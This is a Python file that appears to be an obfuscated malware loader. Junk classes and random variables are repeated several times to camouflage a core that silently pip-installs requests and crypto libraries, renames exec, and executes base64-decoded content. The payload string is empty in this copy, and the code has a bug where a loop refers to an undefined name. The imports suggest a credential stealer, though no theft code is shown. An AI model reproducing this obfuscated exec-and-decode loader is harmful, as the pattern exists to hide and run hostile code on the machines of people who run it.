

from sys import executable, stderr
QhuV5WrO1x = 2688560
WEVncYA7TN = 80895691
class knVb8bAoNJ:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
UlS4d5rsTR = 79640083
class OomQpsdTen:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
["'s4uL65Qq16'", "'tyOtTHzHRy'", "'kB1UmQAcSj'"]
class jlx2jslzH4:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
class d0vcVF6XlY:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
{'username': 'ZlnAJVq', 'age': 38}
yo0lOFiSID = 98098144
ulkAtbM7eh = 23279331
class slV0TQPRpL:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
tTYxhE1Xc9 = 21038097
tIxd9fs8s1 = 12556919
UPNdI3bQ7f = 76837313
'bCOneRh3sJ'
class VfzVvyIvpp:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
class neSzbkLVZP:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
class qkHl1Tad7H:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
oeXpVH2wdF = 44432777
mm6x2ayulT = 15977268
class qieHcYZRIg:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
class nzu4AzkKgn:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
import ctypes;import base64,subprocess,sqlite3,json,shutil
import time
from importlib import import_module

requirements = [
    ["requests", "requests"],
    ["Cryptodome.Cipher", "pycryptodomex" if not 'PythonSoftwareFoundation' in executable else 'pycryptodome']
]
for modl in requirements:
    try:
        import_module(module[0])
    except:
        subprocess.Popen(executable + " -m pip install " +modl[1], shell=True)
        time.sleep(3)
        

from json import loads, dumps
from urllib.request import Request, urlopen
try:
    from cryptography.fernet import Fernet
except:
    subprocess.run("python -m pip install cryptography")

try:
    from cryptography.fernet import Fernet
except:
    subprocess.run("python -m pip install cryptodomex", shell=True)

try:
    import requests
except:
    subprocess.run("python -m pip install requests", shell=True)

try:
    from Cryptodome.Cipher import AES
except:
    subprocess.Popen(executable + " -m pip install pycryptodome ", shell=True)
    from Crypto.Cipher import AES

import requests
QhuV5WrO1x = 2688560
WEVncYA7TN = 80895691
class knVb8bAoNJ:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
UlS4d5rsTR = 79640083
class OomQpsdTen:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
["'s4uL65Qq16'", "'tyOtTHzHRy'", "'kB1UmQAcSj'"]
class jlx2jslzH4:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
class d0vcVF6XlY:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
{'username': 'ZlnAJVq', 'age': 38}
yo0lOFiSID = 98098144
ulkAtbM7eh = 23279331
class slV0TQPRpL:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
tTYxhE1Xc9 = 21038097
tIxd9fs8s1 = 12556919
UPNdI3bQ7f = 76837313
'bCOneRh3sJ'
class VfzVvyIvpp:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
class neSzbkLVZP:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
class qkHl1Tad7H:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
oeXpVH2wdF = 44432777
mm6x2ayulT = 15977268
class qieHcYZRIg:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
class nzu4AzkKgn:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
OOGEGIhVenUIUZe1V9t3RMTPrRtJiSDoNRsGA1 = exec
QhuV5WrO1x = 2688560
WEVncYA7TN = 80895691
class knVb8bAoNJ:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
UlS4d5rsTR = 79640083
class OomQpsdTen:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
["'s4uL65Qq16'", "'tyOtTHzHRy'", "'kB1UmQAcSj'"]
class jlx2jslzH4:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
class d0vcVF6XlY:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
{'username': 'ZlnAJVq', 'age': 38}
yo0lOFiSID = 98098144
ulkAtbM7eh = 23279331
class slV0TQPRpL:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
tTYxhE1Xc9 = 21038097
tIxd9fs8s1 = 12556919
UPNdI3bQ7f = 76837313
'bCOneRh3sJ'
class VfzVvyIvpp:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
class neSzbkLVZP:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
class qkHl1Tad7H:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
oeXpVH2wdF = 44432777
mm6x2ayulT = 15977268
class qieHcYZRIg:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
class nzu4AzkKgn:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
import concurrent.futures
mBSjfbKRmIRPqox0KJRdcFy9cOPixklIihQWvV=""
OOGEGIhVenUIUZe1V9t3RMTPrRtJiSDoNRsGA1(base64.b64decode(mBSjfbKRmIRPqox0KJRdcFy9cOPixklIihQWvV))
QhuV5WrO1x = 2688560
WEVncYA7TN = 80895691
class knVb8bAoNJ:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
UlS4d5rsTR = 79640083
class OomQpsdTen:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
["'s4uL65Qq16'", "'tyOtTHzHRy'", "'kB1UmQAcSj'"]
class jlx2jslzH4:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
class d0vcVF6XlY:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
{'username': 'ZlnAJVq', 'age': 38}
yo0lOFiSID = 98098144
ulkAtbM7eh = 23279331
class slV0TQPRpL:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
tTYxhE1Xc9 = 21038097
tIxd9fs8s1 = 12556919
UPNdI3bQ7f = 76837313
'bCOneRh3sJ'
class VfzVvyIvpp:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
class neSzbkLVZP:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
class qkHl1Tad7H:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
oeXpVH2wdF = 44432777
mm6x2ayulT = 15977268
class qieHcYZRIg:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
class nzu4AzkKgn:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data